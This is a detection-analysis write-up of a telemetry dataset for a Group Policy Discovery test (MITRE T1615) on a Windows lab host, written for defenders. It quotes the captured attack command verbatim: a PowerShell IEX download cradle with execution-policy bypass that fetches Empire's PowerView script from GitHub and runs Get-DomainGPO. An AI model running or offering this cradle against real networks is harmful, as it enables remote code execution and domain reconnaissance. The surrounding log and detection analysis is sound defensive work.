# T1615-2: Group Policy Discovery — Get-DomainGPO to Display Group Policy Information via PowerView

## Technique Context

T1615 (Group Policy Discovery) encompasses adversary use of both native tools and third-party offensive frameworks to enumerate GPOs. PowerView is a widely-used PowerShell reconnaissance library from the PowerSploit/Empire frameworks. The `Get-DomainGPO` function performs LDAP queries against the domain controller to enumerate all GPO objects, providing attackers with a comprehensive map of applied policies.

## What This Dataset Contains

This dataset captures an attempted `Get-DomainGPO` invocation using PowerView loaded via an IEX (Invoke-Expression) download cradle from GitHub. The test ran as NT AUTHORITY\SYSTEM on ACME-WS02 (Windows 11 Enterprise, acme.local domain member), at approximately 02:11 UTC — a different time window from other T1615 tests, indicating a separate execution session.

**Sysmon (4 events)** — This dataset has a notably small Sysmon footprint:
- Two EID 3 (network connection) events: one from `MsMpEng.exe` (Windows Defender) making outbound TCP connections (consistent with cloud lookup triggered by the download), and one from `powershell.exe` connecting to `140.82.114.3` (GitHub's IP range) on port 443.
- One EID 22 (DNS query): `powershell.exe` resolving `github.com` with result `::ffff:140.82.114.3`.
- One additional EID 3 for MsMpEng.exe.

**Security log (7 events)** — EID 4688 and 4689 process create/exit pairs for the PowerShell processes, with no `gpresult` or PowerView-specific process names.

**PowerShell log (48 events)** — The key script block logged by EID 4104:
```
IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO
```
This is the actual attack payload. The outer wrapper block is also logged: `powershell -nop -exec bypass -c "IEX ..."`. Additionally, EID 4103 module-level logging captures `Set-ExecutionPolicy Bypass` and the standard test framework boilerplate EID 4104 stubs appear, but the download cradle and Get-DomainGPO invocation are clearly captured.

## What This Dataset Does Not Contain (and Why)

- **PowerView execution results** — The PowerView `Get-DomainGPO` function performs LDAP enumeration, but the actual GPO names and attributes returned are not present in any event. Windows Defender's real-time protection was active; the download from GitHub may have been blocked or the script may not have fully executed.
- **Sysmon ProcessCreate for powershell.exe** — PowerShell is not on the sysmon-modular ProcessCreate include list, so the outer PowerShell invocation does not appear as EID 1. The Security log 4688 provides complementary process creation coverage.
- **LDAP queries to the DC** — Network connections to the domain controller performing LDAP GPO enumeration are not present, suggesting the IEX download either failed or Defender blocked PowerView execution before it reached that stage.
- **Sysmon image load events** — The Sysmon config's include-mode ProcessCreate filtering applies; the small event count (4 events) suggests the PowerShell process that would have generated ImageLoad events may not have persisted long enough.

## Assessment

This test attempted to use a well-known offensive framework (PowerView/Empire) via a download cradle. The most operationally significant telemetry is the PowerShell script block log (EID 4104) capturing both the IEX download URL and the `Get-DomainGPO` function call — this is exactly what AMSI and script block logging are designed to capture. The Sysmon network connection to GitHub's IP provides a corroborating network indicator. The small overall event count reflects either Defender intervention or the rapid nature of the invocation.

## Detection Opportunities Present in This Data

- **PowerShell EID 4104**: The script block contains the exact string `Get-DomainGPO` and the full Empire/PowerView GitHub URL — both are high-confidence indicators with extremely low false-positive rates in enterprise environments.
- **PowerShell EID 4104**: The presence of `IEX` combined with `Net.WebClient` and `DownloadString` in a single script block is a well-established download cradle pattern.
- **Sysmon EID 3 / EID 22**: `powershell.exe` (running as SYSTEM) making DNS queries to `github.com` and outbound TCP to `140.82.114.3:443` is anomalous for a workstation SYSTEM process and warrants investigation.
- **PowerShell EID 4103**: `-exec bypass` in the host application context (`Host Application = powershell.exe`) confirms policy bypass in the parent process.
